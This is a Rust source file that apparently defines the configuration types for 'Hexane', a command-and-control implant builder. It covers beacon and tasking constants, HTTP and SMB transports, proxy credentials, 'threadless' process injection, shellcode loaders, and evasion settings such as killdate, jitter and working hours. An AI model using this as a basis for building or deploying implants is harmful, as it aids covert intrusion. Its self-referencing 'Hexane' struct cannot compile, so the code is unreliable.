use serde::Deserialize;

const TRANSPORT_HTTP:       u32 = 0x00000001;
const TRANSPORT_PIPE:       u32 = 0x00000002;

const TYPE_CHECKIN:         u32 = 0x7FFFFFFF;
const TYPE_TASKING:         u32 = 0x7FFFFFFE;
const TYPE_RESPONSE:        u32 = 0x7FFFFFFD;
const TYPE_SEGMENT:         u32 = 0x7FFFFFFC;

const COMMAND_DIR:          u32 = 0x00000001;
const COMMAND_MODS:         u32 = 0x00000002;
const COMMAND_NO_JOB:       u32 = 0x00000003;
const COMMAND_SHUTDOWN:     u32 = 0x00000004;
const COMMAND_UPDATE_PEER:  u32 = 0x00000005;

struct UserSession {
    username: String,
    is_admin: bool,
}

#[derive(Deserialize)]
#[serde(tag = "Type", content = "Config")]
pub enum NetworkConfig {
    Http(HttpConfig),
    Smb(SmbConfig),
}

#[derive(Deserialize)]
#[serde(tag = "Type", content = "Config")]
pub enum InjectConfig {
    Threadless(ThreadlessInject),
}

#[derive(Deserialize)]
pub struct HttpConfig {
    address:    String,
    domain:     String,
    useragent:  String,
    port:       String,
    endpoints:  Vec<String>,
    headers:    Vec<String>,
    proxy:      ProxyConfig,
}

#[derive(Deserialize)]
pub struct SmbConfig {
    egress_name: String,
    egress_peer: String,
}

#[derive(Deserialize)]
pub struct ProxyConfig {
    address:    String,
    port:       String,
    proto:      String,
    username:   String,
    password:   String,
}

#[derive(Deserialize)]
pub struct ThreadlessInject {
    target_process:     String,
    target_module:      String,
    target_function:    String,
    loader_assembly:    String,
    execute_object:     String,
}

#[derive(Deserialize)]
pub struct Config {
    debug:          bool,
    encrypt:        bool,
    architecture:   String,
    hostname:       String,
    working_hours:  String,
    killdate:       String,
    sleeptime:      i32,
    jitter:         i8,
}

#[derive(Deserialize)]
pub struct Builder {
    output_name:            String,
    root_directory:         String,
    linker_script:          String,
    dependencies:           Vec<String>,
    include_directories:    Vec<String>,
    loaded_modules:         Vec<String>,
}

#[derive(Deserialize)]
pub struct Loader {
    root_directory: String,
    linker_script:  String,
    rsrc_script:    String,
    sources:        Vec<String>,
    dependencies:   Vec<String>,
    injection:      InjectConfig,
}

#[derive(Deserialize)]
pub struct JsonData {
    config:     Config,
    network:    NetworkConfig,
    builder:    Builder,
    loader:     Loader,
}

pub struct CompilerConfig {
    mingw:              String,
    linker:             String,
    objcopy:            String,
    windres:            String,
    strip:              String,
    file_extension:     String,
    build_directory:    String,
    compiler_flags:     Vec<String>,
}

pub struct Hexane {
    current_taskid: u32,
    peer_id:        u32,
    group_id:       i32,
    build_type:     i32,

    crypt_key:      Vec<u8>,
    shellcode:      Vec<u8>,
    config_data:    Vec<u8>,
    network_type:   u32,
    active:         bool,

    compiler:       CompilerConfig,
    user_session:   UserSession,
    json_data:      JsonData,
    next:           Hexane,
}
